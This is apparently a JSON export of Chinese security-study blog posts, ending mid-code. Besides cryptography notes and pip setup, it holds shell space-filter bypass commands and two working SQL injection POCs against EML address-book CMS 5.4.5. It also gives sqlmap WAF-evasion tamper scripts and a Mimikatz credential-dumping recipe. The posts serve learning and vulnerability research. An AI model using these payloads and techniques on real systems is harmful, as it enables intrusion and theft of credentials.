[{"title":"密码学基础笔记(一)","url":"http://yoursite.com/2019/01/07/密码学基础笔记(一)/","content":"<h2 id=\"第一章-概览\"><a href=\"#第一章-概览\" class=\"headerlink\" title=\"第一章 概览\"></a>第一章 概览</h2><h3 id=\"计算机安全概念\"><a href=\"#计算机安全概念\" class=\"headerlink\" title=\"计算机安全概念\"></a>计算机安全概念</h3><p>定义：</p>\n<blockquote>\n<p>“对于一个自动化的信息系统，采取保护措施确保信息系统资源（包括硬件、软件、固件、信息/数据和通信）的保密性、完整性、可用性。”</p>\n</blockquote>\n<p>3个关键目标（CIA）：</p>\n<ul>\n<li>保密性（Confidentiality）<ul>\n<li>数据保密性</li>\n<li>隐私性</li>\n</ul>\n</li>\n<li>完整性（Integrity）<ul>\n<li>数据完整性</li>\n<li>系统完整性</li>\n</ul>\n</li>\n<li>可用性（Availability）</li>\n</ul>\n<p>其他概念：</p>\n<ul>\n<li>真实性（Authenticity）</li>\n<li>可追溯性（Accountability）</li>\n</ul>\n<h3 id=\"OSI安全框架\"><a href=\"#OSI安全框架\" class=\"headerlink\" title=\"OSI安全框架\"></a>OSI安全框架</h3><p>主要关注：</p>\n<ul>\n<li><p>安全攻击</p>\n<ul>\n<li>被动攻击<ul>\n<li>信息内容的泄露</li>\n<li>流量分析</li>\n</ul>\n</li>\n<li>主动攻击<ul>\n<li>伪装</li>\n<li>重播</li>\n<li>消息修改</li>\n<li>拒绝服务</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>安全机制<ul>\n<li>特定安全机制：加密、数字签名、访问控制、数据完整性、认证交换、流量填充、路由控制、公证。</li>\n<li>普遍安全机制：可信功能、安全标签、事件检测、安全审计跟踪、安全恢复。</li>\n</ul>\n</li>\n<li>安全服务<ul>\n<li>认证</li>\n<li>访问控制</li>\n<li>数据保密性</li>\n<li>数据完整性</li>\n<li>不可否认性</li>\n</ul>\n</li>\n</ul>\n<blockquote>\n<p>是一种由系统提供的对系统资源进行特殊保护的处理或通信服务。(RFC4949)</p>\n</blockquote>\n<h3 id=\"网络安全模型\"><a href=\"#网络安全模型\" class=\"headerlink\" title=\"网络安全模型\"></a>网络安全模型</h3><p><img src=\"/images/网络安全模型.png\" alt=\"\"></p>\n<p>可信第三方：</p>\n<ul>\n<li>第三方负责将秘密信息分配给通信双方，而对攻击者保密。</li>\n<li>或者当通信双方关于信息传输的真实性发生争执时，由第三方来仲裁。</li>\n</ul>\n<p>安全服务：</p>\n<ol>\n<li>设计算法</li>\n<li>产生秘密信息</li>\n<li>分配和共享</li>\n<li>指明协议实现安全服务</li>\n</ol>\n<h2 id=\"第二章-传统加密技术\"><a href=\"#第二章-传统加密技术\" class=\"headerlink\" title=\"第二章 传统加密技术\"></a>第二章 传统加密技术</h2><h3 id=\"基本概念\"><a href=\"#基本概念\" class=\"headerlink\" title=\"基本概念\"></a>基本概念</h3><ul>\n<li><p>密码学</p>\n<ul>\n<li>密码编码学</li>\n<li>密码分析学</li>\n</ul>\n</li>\n<li><p>明文：原始的消息</p>\n</li>\n<li>密文： 加密后的消息</li>\n<li>加密：从明文到密文的变换过程</li>\n<li>解密：从密文到明文的变换过程</li>\n</ul>\n<h3 id=\"对称密码模型\"><a href=\"#对称密码模型\" class=\"headerlink\" title=\"对称密码模型\"></a>对称密码模型</h3><p>5个基本成分：</p>\n<ul>\n<li>明文</li>\n<li>加密算法</li>\n<li>密钥</li>\n<li>密文</li>\n<li>解密算法</li>\n</ul>\n<p><img src=\"/images/对称密码模型.png\" alt=\"\">     </p>\n<ul>\n<li><p>加密算法根据输入信息X和密钥K生成密文Y=[Y1, Y2, …, YN]，即Y=E[K, X]。</p>\n</li>\n<li><p>有密钥K的合法接收者，可进行解密变换X=D[K, Y]。</p>\n</li>\n</ul>\n<p><img src=\"/images/对称密码体制.png\" alt=\"\"></p>\n<h3 id=\"密码编码学\"><a href=\"#密码编码学\" class=\"headerlink\" title=\"密码编码学\"></a>密码编码学</h3><p>3个独立特征：</p>\n<ol>\n<li>转换明文为密文的运算类型：代替 vs. 置换。</li>\n<li>所用的密钥数：对称密码 vs. 公钥密码。</li>\n<li>处理明文的方法：分组密码 vs. 流密码。</li>\n</ol>\n<h3 id=\"密码分析学和穷举攻击\"><a href=\"#密码分析学和穷举攻击\" class=\"headerlink\" title=\"密码分析学和穷举攻击\"></a>密码分析学和穷举攻击</h3><p>攻击通用方法：</p>\n<ul>\n<li>密码分析学</li>\n<li>穷举攻击</li>\n</ul>\n<blockquote>\n<p>Kerckhoffs原则：假定密码攻击者知道加密数据所使用的算法，数据的安全性应当取决于密钥的选择。</p>\n<p>​    <strong>无条件安全</strong>：无论花多少时间，攻击者都无法解密密文。</p>\n<p>​    Shannon已经证明：除了一次一密之外，所有的加密算法都不会是无条件安全的。</p>\n</blockquote>\n<p>加密算法应尽量满足：</p>\n<ul>\n<li><p>破译密码的<strong>代价</strong>超出密文信息的价值</p>\n</li>\n<li><p>破译密码的<strong>时间</strong>超出密文信息的有效生命期</p>\n</li>\n</ul>\n<p>如果加密体制满足了上述两条标准中的任意一条，则它是<strong>计算安全</strong>的。然而，估计攻击者成功破译密文所需的工作量是非常困难的。</p>\n<h3 id=\"代替技术\"><a href=\"#代替技术\" class=\"headerlink\" title=\"代替技术\"></a>代替技术</h3><p><strong>Caesar密码</strong>：</p>\n<blockquote>\n<p>对字母表中的每个字母，用它之后的第3个字母来代替</p>\n</blockquote>\n<p>细节：</p>\n<ol>\n<li>加密算法：Ek(m) ≡ m + 3 (mod 26)</li>\n<li>解密算法：Dk(c) ≡ c - 3 (mod 26)</li>\n</ol>\n<blockquote>\n<p>凯撒密码的密钥空间太小，穷举攻击25种可能</p>\n</blockquote>\n<p><strong>单表代替密码</strong>：</p>\n<blockquote>\n<p>Caesar密码只有25种可能的密钥，是不安全的。通过允许任意代替，密钥空间将会急剧增大。一般，具有n个元素的集合有n!个置换。如果密文是26个字母的任意置换，那么就有26!种可能的密钥。</p>\n</blockquote>\n<p><strong>Playfair密码</strong>：</p>\n<p>基于一个5×5的字母矩阵。字母矩阵构造方法如下：</p>\n<ol>\n<li>选一个英文短语或单词作为密钥，去掉其中重复的字母得到一个无重复字母的字符串。</li>\n<li>然后再将字母表中剩下的字母依次从左到右、从上往下填入矩阵中，字母i，j占同一个位置。</li>\n</ol>\n<blockquote>\n<p>（详细见ppt第一讲108页）</p>\n</blockquote>\n","categories":[],"tags":["密码学"]},{"title":"Blank Bypass","url":"http://yoursite.com/2018/11/15/Blank Bypass/","content":"<ol>\n<li><p>cat&lt;1.txt</p>\n<p><img src=\"/images/black1.PNG\" alt=\"\"></p>\n</li>\n<li><p>cat$IFS$91.txt</p>\n<p><img src=\"/images/black2.PNG\" alt=\"\"></p>\n</li>\n<li><p>cat${IFS}1.txt</p>\n<p><img src=\"/images/black3.PNG\" alt=\"\"></p>\n</li>\n<li><p>cat&lt;&gt;1.txt</p>\n<p><img src=\"/images/black4.PNG\" alt=\"\"></p>\n</li>\n<li><p>{cat,1.txt}</p>\n<p><img src=\"/images/black5.PNG\" alt=\"\"></p>\n</li>\n<li><p>CMD=$’\\x201.txt’&amp;&amp;cat$CMD</p>\n<p><img src=\"/images/black6.PNG\" alt=\"\"></p>\n</li>\n<li><p>CMD=$’\\x0a1.txt’&amp;&amp;cat$CMD</p>\n<p><img src=\"/images/black7.PNG\" alt=\"\"></p>\n</li>\n<li><p>CMD=$’\\x091.txt’&amp;&amp;cat$CMD</p>\n<p><img src=\"/images/black8.PNG\" alt=\"\"></p>\n</li>\n</ol>\n","categories":[],"tags":["linux"]},{"title":"EML企业通讯录管理系统两处注入分析","url":"http://yoursite.com/2018/08/12/EML企业通讯录管理系统两处注入分析/","content":"<h1 id=\"0x00-前言\"><a href=\"#0x00-前言\" class=\"headerlink\" title=\"0x00 前言\"></a>0x00 前言</h1><p>最近一直在用onenote整理笔记，结果发现博客已经荒了很久了，就把审过的漏洞贴上来吧。虽然没有什么技术含量，但总归是一点记录。</p>\n<h1 id=\"0x01-漏洞环境\"><a href=\"#0x01-漏洞环境\" class=\"headerlink\" title=\"0x01 漏洞环境\"></a>0x01 漏洞环境</h1><p>CMS：EML企业通讯录管理系统</p>\n<p>版本：5.4.5</p>\n<p>官方网站：<a href=\"http://bbs.emlsoft.com\" target=\"_blank\" rel=\"external\">http://bbs.emlsoft.com</a> </p>\n<p>更新时间：2018.7.26 </p>\n<p>测试环境：windows10+phpstudy+php5.5</p>\n<h1 id=\"0x02-漏洞分析\"><a href=\"#0x02-漏洞分析\" class=\"headerlink\" title=\"0x02 漏洞分析\"></a>0x02 漏洞分析</h1><h3 id=\"过滤函数：\"><a href=\"#过滤函数：\" class=\"headerlink\" title=\"过滤函数：\"></a>过滤函数：</h3><p>对于小cms的sql注入的审计，一般存在两个方向：</p>\n<ol>\n<li>系统过滤机制的正面bypass;</li>\n<li>过滤的盲区(如：GPC之外的注入、limit/orderby之后的注入、二次入库的注入以及忘记过滤的地方等.);</li>\n</ol>\n<p>当然，后者出现的概率更大并且也更好挖一点，先来看看过滤函数：</p>\n<p>/lib/func.class.php:(27-37行)</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">//安全验证</span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">_RunMagicQuotes</span><span class=\"params\">(&amp;$svar)</span></span>&#123;</div><div class=\"line\">\t<span class=\"keyword\">if</span>(!get_magic_quotes_gpc())\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span>( is_array($svar) )&#123;</div><div class=\"line\">\t\t\t<span class=\"keyword\">foreach</span>($svar <span class=\"keyword\">as</span> $k =&gt; $v) $svar[$k] = _RunMagicQuotes($v);</div><div class=\"line\">\t\t&#125;<span class=\"keyword\">else</span>&#123;</div><div class=\"line\">\t\t\t$svar = addslashes($svar);</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">return</span> $svar;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>未开启GPC则使用addslashes，也考虑到了数组的情况。感觉只要使用得当，就应该没有什么问题。</p>\n<h3 id=\"第一处注入：\"><a href=\"#第一处注入：\" class=\"headerlink\" title=\"第一处注入：\"></a>第一处注入：</h3><p>action/action.address.php：（60-68行）</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\"> <span class=\"comment\">//设置分页</span></div><div class=\"line\"><span class=\"keyword\">if</span>($_POST[numPerPage]==<span class=\"string\">\"\"</span>)&#123;$numPerPage=<span class=\"string\">\"10\"</span>;&#125;<span class=\"keyword\">else</span>&#123;$numPerPage=$_POST[numPerPage];&#125;</div><div class=\"line\"><span class=\"keyword\">if</span>($_GET[pageNum]==<span class=\"string\">\"\"</span>||$_GET[pageNum]==<span class=\"string\">\"0\"</span> )&#123;$pageNum=<span class=\"string\">\"0\"</span>;&#125;<span class=\"keyword\">else</span>&#123;$pageNum=($_GET[pageNum]<span class=\"number\">-1</span>)*$numPerPage;&#125;</div><div class=\"line\">$num=mysql_query(<span class=\"string\">\"select * from eml_address_list where 1=1 $search\"</span>);<span class=\"comment\">//当前频道条数</span></div><div class=\"line\">$total=mysql_num_rows($num);<span class=\"comment\">//总条数\t</span></div><div class=\"line\">$page=<span class=\"keyword\">new</span> page(<span class=\"keyword\">array</span>(<span class=\"string\">'total'</span>=&gt;$total,<span class=\"string\">'perpage'</span>=&gt;$numPerPage));</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">//查询</span></div><div class=\"line\">$sql=<span class=\"string\">\"select * from eml_address_list  where 1=1  $search order by id desc limit $pageNum,$numPerPage\"</span>;</div></pre></td></tr></table></figure>\n<p>$pageNum $numPerPage 未进行过滤处理直接带入了查询语句，但是前者应该无法利用：<code>（$pageNum=($_GET[pageNum]-1)*$numPerPage;）</code></p>\n<p>后者位于limit中并且存在order by，(<a href=\"http://www.freebuf.com/articles/web/57528.html\" target=\"_blank\" rel=\"external\">参考文章</a>)可使用如下利用方式。</p>\n<p>POC：</p>\n<p><code>numPerPage=1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),0x7e);</code></p>\n<p><img src=\"/images/sqli1.PNG\" alt=\"\"></p>\n<h3 id=\"第二处注入：\"><a href=\"#第二处注入：\" class=\"headerlink\" title=\"第二处注入：\"></a>第二处注入：</h3><p>action/action.address.php：（186-206行)</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">//批量删除</span></div><div class=\"line\"><span class=\"keyword\">if</span>($do==<span class=\"string\">\"del_all\"</span>)&#123;</div><div class=\"line\">\tIf_rabc($action,$do); <span class=\"comment\">//检测权限</span></div><div class=\"line\">\tis_admin($action,$do); <span class=\"comment\">//检测权限</span></div><div class=\"line\">\t$arr = $_POST[<span class=\"string\">\"item\"</span>];</div><div class=\"line\">\t$count_arr=count($arr); </div><div class=\"line\">\t<span class=\"keyword\">if</span>($count_arr==<span class=\"number\">0</span>)&#123;</div><div class=\"line\">\t<span class=\"keyword\">echo</span> error($msg); </div><div class=\"line\">\t<span class=\"keyword\">exit</span>;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t$str = implode(<span class=\"string\">\"','\"</span>,$arr);<span class=\"comment\">//拼接字符</span></div><div class=\"line\">\t</div><div class=\"line\">\t$sql = <span class=\"string\">\"delete from eml_address_list WHERE id in('&#123;$str&#125;')\"</span>;</div><div class=\"line\">\t</div><div class=\"line\">\t<span class=\"keyword\">if</span>($db-&gt;query($sql))&#123;<span class=\"keyword\">echo</span> success($msg,<span class=\"string\">\"?action=address\"</span>);&#125;<span class=\"keyword\">else</span>&#123;<span class=\"keyword\">echo</span> error($msg);&#125;</div></pre></td></tr></table></figure>\n<p>item参数通过POST方法传入，使用implode函数进行数组=&gt;字符串，然后未经过滤直接进入delete语句执行，同样是忘记使用过滤函数的问题，不同点是必须传入数组才能利用，当然此处检测了is_admin，需要后台权限才能利用，比上一处利用条件更苛刻。</p>\n<p>POC:</p>\n<p><code>item[]=2&#39;) or updatexml(1,concat(0x7e,(version())),0) -- dd</code></p>\n<p><img src=\"/images/sqli2.PNG\" alt=\"\"></p>\n<h1 id=\"0x03-总结\"><a href=\"#0x03-总结\" class=\"headerlink\" title=\"0x03 总结\"></a>0x03 总结</h1><p>感觉简单的太简单，难的又审不动，要走的路还很长呢。。。 </p>\n","categories":[],"tags":["代码审计"]},{"title":"Socks5_proxy","url":"http://yoursite.com/2018/05/21/Socks5_proxy/","content":"<h1 id=\"Info：\"><a href=\"#Info：\" class=\"headerlink\" title=\"Info：\"></a>Info：</h1><p>毕业设计做出这么个东西，也是蛮水的。。。    </p>\n<h1 id=\"Usage\"><a href=\"#Usage\" class=\"headerlink\" title=\"Usage:\"></a>Usage:</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">python Socks5_proxy.py       -- run on 1080</div><div class=\"line\">python Socks5_proxy.py 2333  -- run on 2333</div></pre></td></tr></table></figure>\n<h1 id=\"Test\"><a href=\"#Test\" class=\"headerlink\" title=\"Test:\"></a>Test:</h1><p><img src=\"/images/test1.PNG\" alt=\"\"></p>\n<p><img src=\"/images/test2.PNG\" alt=\"\"></p>\n<h1 id=\"Reference\"><a href=\"#Reference\" class=\"headerlink\" title=\"Reference:\"></a>Reference:</h1><ul>\n<li><a href=\"https://github.com/felix021/ssocks5/blob/master/ssocks5.py\" target=\"_blank\" rel=\"external\">ssocks5</a></li>\n<li><a href=\"https://github.com/RicterZ/reprocks/blob/master/server/reprocks_server.py\" target=\"_blank\" rel=\"external\">repocks</a></li>\n<li><a href=\"https://www.ietf.org/rfc/rfc1928.txt\" target=\"_blank\" rel=\"external\">rfc1928</a><h1 id=\"Download\"><a href=\"#Download\" class=\"headerlink\" title=\"Download:\"></a>Download:</h1></li>\n</ul>\n<p><a href=\"https://github.com/sun1024/Socks5_proxy\" target=\"_blank\" rel=\"external\">Socks5_proxy</a></p>\n","categories":[],"tags":[]},{"title":"Some Sqlmap Tricks","url":"http://yoursite.com/2017/08/19/Some Sqlmap Tricks/","content":"<h2 id=\"0x01-–prefix-–suffix\"><a href=\"#0x01-–prefix-–suffix\" class=\"headerlink\" title=\"0x01 –prefix,–suffix\"></a>0x01 –prefix,–suffix</h2><p>在注入的payload的前面或者后面加一些字符, 使sql语句能正常拼接:</p>\n<p><code>--prefix &quot;xxx&quot; --suffix &quot;xxx&quot;</code></p>\n<h2 id=\"0x02-–start-–stop\"><a href=\"#0x02-–start-–stop\" class=\"headerlink\" title=\"0x02 –start –stop\"></a>0x02 –start –stop</h2><p>表中的数据量过多, 或者盲注太费时间, 使用–start,–stop指定几行数据:</p>\n<p><code>--start num1 --stop num2</code></p>\n<h2 id=\"0x03-–search\"><a href=\"#0x03-–search\" class=\"headerlink\" title=\"0x03 –search\"></a>0x03 –search</h2><p>寻找特定的数据库名，所有数据库中的特定表名，所有数据库表中的特定字段:</p>\n<p><code>--search -C sfzh</code></p>\n<h2 id=\"0x04-–count\"><a href=\"#0x04-–count\" class=\"headerlink\" title=\"0x04 –count\"></a>0x04 –count</h2><p>只获取表中的数据个数:</p>\n<p><code>--count -D testDB</code></p>\n<h2 id=\"0x05-一些tamper\"><a href=\"#0x05-一些tamper\" class=\"headerlink\" title=\"0x05 一些tamper\"></a>0x05 一些tamper</h2><p>如果web应用使用asp/asp.net开发，charunicodeencode.py和percentage.py可以绕过Waf。</p>\n<p><code>--tamepr=charunicodeencode</code><br><code>--tamepr=percentage</code></p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"http://119.29.64.123:8080/WooyunDrops/#!/drops/25.sqlmap%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C\" target=\"_blank\" rel=\"external\">sqlmap用户手册</a><br><a href=\"http://www.freebuf.com/articles/1000.html\" target=\"_blank\" rel=\"external\">如何使用SQLMap绕过WAF</a></p>\n","categories":[],"tags":["Sqlmap"]},{"title":"Mimikatz简单使用（备忘）","url":"http://yoursite.com/2017/04/28/Mimikatz简单使用（备忘）/","content":"<ul>\n<li>下载地址：<br><a href=\"https://github.com/gentilkiwi/mimikatz/releases/latest\" target=\"_blank\" rel=\"external\">Mimikatz</a></li>\n<li><p>简单使用：</p>\n<ul>\n<li>step1:<br>以管理员身份运行mimikatz.exe<br>(根据计算机系统选择相应版本)</li>\n<li><p>step2:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">privilege::debug</div><div class=\"line\"></div><div class=\"line\">#提升权限</div></pre></td></tr></table></figure>\n</li>\n<li><p>step3:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">sekurlsa::logonpasswords</div><div class=\"line\"></div><div class=\"line\">#获取密码</div></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n</ul>\n","categories":[],"tags":["Mimikatz"]},{"title":"firefox更换中文语言包","url":"http://yoursite.com/2017/04/07/firefox更换中文语言包/","content":"<p>记录一下，免得下次再去网上搜</p>\n<ul>\n<li>中文语言包下载地址：<br><code>http://ftp.mozilla.org/pub/mozilla.org/firefox/releases/27.0.1/win32/xpi/zh-CN.xpi</code><br>(版本号:27.0.1/操作系统：win32)</li>\n<li><p>在FireFox地址栏里输入”about:config”。</p>\n</li>\n<li><p>然后在过滤器里输入general.useragent.locale，双击然后在弹出的对话框里输入”zh-CN”。</p>\n</li>\n<li><p>重启，更换成功。</p>\n</li>\n</ul>\n","categories":[],"tags":["firefox"]},{"title":"pip修改官方源踩的坑","url":"http://yoursite.com/2017/03/29/pip修改官方源踩的坑/","content":"<h2 id=\"linux篇：\"><a href=\"#linux篇：\" class=\"headerlink\" title=\"linux篇：\"></a>linux篇：</h2><ul>\n<li>编辑配置文件（如果没有, 新建一份）：<br><code>vi ~/.pip/pip.conf</code></li>\n<li><p>在配置文件内加上（这里使用豆瓣源）:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">[global]</div><div class=\"line\">index-url = http://pypi.douban.com/simple</div><div class=\"line\">trusted-host = pypi.douban.com</div></pre></td></tr></table></figure>\n</li>\n<li><p>然后就可以愉快地：<br><code>pip install xxxxx</code></p>\n</li>\n</ul>\n<h2 id=\"windows篇（比较奇葩）：\"><a href=\"#windows篇（比较奇葩）：\" class=\"headerlink\" title=\"windows篇（比较奇葩）：\"></a>windows篇（比较奇葩）：</h2><ul>\n<li>新建文件（pip文件夹与pip.ini都要自己新建）：<br><code>C:\\Users\\用户名\\pip\\pip.ini</code><br>注意：不是C:\\Users\\用户名\\AppData\\Local\\pip下的 pip.ini</li>\n<li><p>在配置文件内加上（这里使用豆瓣源）:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">[global]</div><div class=\"line\">index-url = http://pypi.douban.com/simple</div><div class=\"line\">trusted-host = pypi.douban.com</div></pre></td></tr></table></figure>\n</li>\n<li><p>然后就可以愉快地：<br><code>pip install xxxxx</code></p>\n</li>\n</ul>\n<h2 id=\"参考链接：\"><a href=\"#参考链接：\" class=\"headerlink\" title=\"参考链接：\"></a>参考链接：</h2><p><a href=\"https://www.v2ex.com/t/291817\" target=\"_blank\" rel=\"external\">https://www.v2ex.com/t/291817</a><br><a href=\"https://ficapy.github.io/2013/12/27/pip_use_china_mirror/\" target=\"_blank\" rel=\"external\">https://ficapy.github.io/2013/12/27/pip_use_china_mirror/</a></p>\n","categories":[],"tags":["python"]},{"title":"sqlmap扩展tamper及其简单编写","url":"http://yoursite.com/2017/03/22/sqlmap扩展tamper及其简单编写/","content":"<h2 id=\"常见tamper-搜集自网络-：\"><a href=\"#常见tamper-搜集自网络-：\" class=\"headerlink\" title=\"常见tamper(搜集自网络)：\"></a>常见tamper(搜集自网络)：</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div></pre></td><td class=\"code\"><pre><div class=\"line\">apostrophemask.py 用UTF-8全角字符替换单引号字符</div><div class=\"line\">apostrophenullencode.py 用非法双字节unicode字符替换单引号字符</div><div class=\"line\">appendnullbyte.py 在payload末尾添加空字符编码</div><div class=\"line\">base64encode.py 对给定的payload全部字符使用Base64编码</div><div class=\"line\">between.py 分别用“NOT BETWEEN 0 AND #”替换大于号“&gt;”，“BETWEEN # AND #”替换等于号“=”</div><div class=\"line\">bluecoat.py 在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”</div><div class=\"line\">chardoubleencode.py 对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）</div><div class=\"line\">charencode.py 对给定的payload全部字符使用URL编码（不处理已经编码的字符）</div><div class=\"line\">charunicodeencode.py 对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）</div><div class=\"line\">concat2concatws.py 用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例</div><div class=\"line\">equaltolike.py  用“LIKE”运算符替换全部等于号“=”</div><div class=\"line\">greatest.py  用“GREATEST”函数替换大于号“&gt;”</div><div class=\"line\">halfversionedmorekeywords.py 在每个关键字之前添加MySQL注释</div><div class=\"line\">ifnull2ifisnull.py 用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例</div><div class=\"line\">lowercase.py 用小写值替换每个关键字字符</div><div class=\"line\">modsecurityversioned.py 用注释包围完整的查询</div><div class=\"line\">modsecurityzeroversioned.py 用当中带有数字零的注释包围完整的查询</div><div class=\"line\">multiplespaces.py 在SQL关键字周围添加多个空格</div><div class=\"line\">nonrecursivereplacement.py 用representations替换预定义SQL关键字，适用于过滤器</div><div class=\"line\">overlongutf8.py 转换给定的payload当中的所有字符</div><div class=\"line\">percentage.py 在每个字符之前添加一个百分号</div><div class=\"line\">randomcase.py 随机转换每个关键字字符的大小写</div><div class=\"line\">randomcomments.py 向SQL关键字中插入随机注释</div><div class=\"line\">securesphere.py 添加经过特殊构造的字符串</div><div class=\"line\">sp_password.py 向payload末尾添加“sp_password” for automatic obfuscation from DBMS logs</div><div class=\"line\">space2comment.py 用“/**/”替换空格符</div><div class=\"line\">space2dash.py 用破折号注释符“--”其次是一个随机字符串和一个换行符替换空格符</div><div class=\"line\">space2hash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符</div><div class=\"line\">space2morehash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符</div><div class=\"line\">space2mssqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</div><div class=\"line\">space2mssqlhash.py 用磅注释符“#”其次是一个换行符替换空格符</div><div class=\"line\">space2mysqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</div><div class=\"line\">space2mysqldash.py 用破折号注释符“--”其次是一个换行符替换空格符</div><div class=\"line\">space2plus.py 用加号“+”替换空格符</div><div class=\"line\">space2randomblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</div><div class=\"line\">unionalltounion.py 用“UNION SELECT”替换“UNION ALL SELECT”</div><div class=\"line\">unmagicquotes.py 用一个多字节组合%bf%27和末尾通用注释一起替换空格符</div><div class=\"line\">varnish.py 添加一个HTTP头“X-originating-IP”来绕过WAF</div><div class=\"line\">versionedkeywords.py 用MySQL注释包围每个非函数关键字</div><div class=\"line\">versionedmorekeywords.py 用MySQL注释包围每个关键字</div><div class=\"line\">xforwardedfor.py 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF</div></pre></td></tr></table></figure>\n<h2 id=\"tamper的简单编写：\"><a href=\"#tamper的简单编写：\" class=\"headerlink\" title=\"tamper的简单编写：\"></a>tamper的简单编写：</h2><p>栗子：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># sqlmap/tamper/yourtamper.py</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">from</span> lib.core.enums <span class=\"keyword\">import</span> PRIORITY</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#定义脚本的优先级，用于有多个tamper脚本的情况</span></div><div class=\"line\">__priority__ = PRIORITY.LOWEST </div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#声明该脚本适用/不适用的范围，可以为空</span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">dependencies</span><span class=\"params\">()</span>:</span></div><div class=\"line\">\t<span class=\"keyword\">pass</span> </div><div class=\"line\">\t</div><div class=\"line\"><span class=\"comment\">#主要函数，接受的参数为payload和**kwargs返回值为替换后的payload</span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">tamper</span><span class=\"params\">(payload, **kwargs)</span>:</span></div><div class=\"line\">    <span class=\"keyword\">return</span> payload.replace(<span class=\"string\">\".\"</span>, <span 